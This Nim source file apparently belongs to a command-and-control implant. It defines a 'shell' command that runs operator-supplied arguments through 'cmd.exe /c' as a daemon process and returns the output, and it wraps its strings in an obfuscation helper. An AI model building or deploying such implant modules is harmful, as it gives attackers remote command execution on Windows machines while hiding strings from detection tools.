import osproc
from ../../util/strenc import obf

# Execute a shell command through 'cmd.exe /c' and return output
proc shell*(args : seq[string]) : string =
    var commandArgs : seq[string]
    
    if args.len == 0 or args[0] == "":
        result = obf("Invalid number of arguments received. Usage: 'shell [command]'.")
    else:
        commandArgs.add(obf("/c"))
        for arg in args:
            commandArgs.add(arg)
        result = execProcess(obf("cmd"), args=commandArgs, options={poUsePath, poStdErrToStdOut, poDaemon})